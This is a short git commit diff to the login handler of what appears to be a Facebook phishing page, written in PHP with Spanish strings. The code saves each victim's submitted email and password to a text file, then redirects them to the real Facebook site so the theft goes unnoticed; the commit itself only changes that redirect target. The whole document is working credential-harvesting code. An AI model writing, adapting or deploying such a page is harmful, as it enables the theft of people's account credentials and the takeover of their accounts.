10505594d1c110d63110a6a32e70369cc7dc3b78
Euronymou5 <85043356+Euronymou5@users.noreply.github.com>
2022-03-11 02:21:06 -0600

    Update login.php

--- .pages/Facebook/login.php
+++ .pages/Facebook/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usuarios.txt", "Usuario de Facebook: " . $_POST['email'] . " Contraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
+header('Location: https://www.facebook.com/');
 exit();
 ?>
